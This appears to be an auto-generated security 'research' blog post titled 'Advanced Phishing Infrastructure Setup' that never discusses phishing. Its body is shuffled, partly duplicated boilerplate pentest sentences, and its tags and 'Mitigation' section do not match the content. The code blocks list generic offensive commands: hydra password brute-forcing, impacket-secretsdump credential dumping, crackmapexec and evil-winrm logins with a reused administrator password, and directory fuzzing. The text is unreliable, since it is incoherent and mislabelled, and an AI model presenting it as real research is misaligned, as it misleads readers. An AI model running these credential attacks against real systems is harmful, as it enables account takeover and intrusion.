---
TitleSEO: "Advanced Phishing Infrastructure Setup | ZureFX"
TitlePost: "Advanced Phishing Infrastructure Setup"
Author: "ZureFX"
Description: "Technical research on Advanced Phishing Infrastructure Setup. In-depth analysis with PoC and mitigation strategies."
Keywords: "rop, format string, buffer overflow"
URL: "https://zurefx.github.io/research/research-advanced-phishing-infrastructure-setup-641.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/research/research-advanced-phishing-infrastructure-setup-641/"
Date: "2024-12-25"
Tags: "ROP, Format String, Buffer Overflow"
Section: "research"
Lang: "en"
main_img: "research-advanced-phishing-infrastructure-setup-64"
Permalink: "/research/research-advanced-phishing-infrastructure-setup-641.html"
BtnLabel: "Read Research"
Pick: 0
---
## Abstract

### Summary

Weak file permissions allowed modification of critical system files. Lateral movement was facilitated by reusing discovered credentials across services. Group Policy Preferences contained encrypted but recoverable credentials. Initial enumeration revealed several interesting open ports on the target.

## Background

### Context

The database credentials were hardcoded in the application source code. The scheduled task ran with elevated privileges and could be abused for escalation. Command injection was possible through unsanitized user input in the search functionality.

### Related Work

The service was running without proper input validation, leading to injection vulnerabilities. Post-exploitation enumeration revealed a path to domain administrator privileges. Unconstrained delegation was enabled on the compromised machine.

## Technical Analysis

### Vulnerability Details

Command injection was possible through unsanitized user input in the search functionality. Weak file permissions allowed modification of critical system files. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
gobuster dir -u http://10.29.121.101/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.240.237 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.94.77.120
crackmapexec smb 10.101.163.148 -u administrator -p 'P@ssw0rd!' --shares
```

Privilege escalation was possible due to misconfigured sudo permissions. Privilege escalation was possible due to misconfigured sudo permissions.

### Proof of Concept

The web application was vulnerable to Server-Side Template Injection (SSTI). Lateral movement was facilitated by reusing discovered credentials across services.

```python
evil-winrm -i 10.40.220.240 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.100.99.232 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Network traffic analysis revealed unencrypted communications containing user credentials. The service was running without proper input validation, leading to injection vulnerabilities.

### Exploitation Chain

Command injection was possible through unsanitized user input in the search functionality. Post-exploitation enumeration revealed a path to domain administrator privileges. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.51.236.123/FUZZ
crackmapexec smb 10.47.193.40 -u administrator -p 'P@ssw0rd!' --shares
```

## Impact Assessment

### Risk Analysis

The kernel version was outdated and vulnerable to a publicly known exploit. The scheduled task ran with elevated privileges and could be abused for escalation. Command injection was possible through unsanitized user input in the search functionality. Command injection was possible through unsanitized user input in the search functionality.

## Mitigation

### Short-term Fixes

- Initial enumeration revealed several interesting open ports on the target.
- Command injection was possible through unsanitized user input in the search functionality.
- The scheduled task ran with elevated privileges and could be abused for escalation.

### Long-term Recommendations

Token impersonation allowed elevation to SYSTEM privileges on the target. Privilege escalation was possible due to misconfigured sudo permissions. The service account had excessive permissions assigned in Active Directory.

## Conclusion

### Final Thoughts

The kernel version was outdated and vulnerable to a publicly known exploit. The target system was identified as running a vulnerable version of the service. The web application was vulnerable to Server-Side Template Injection (SSTI).
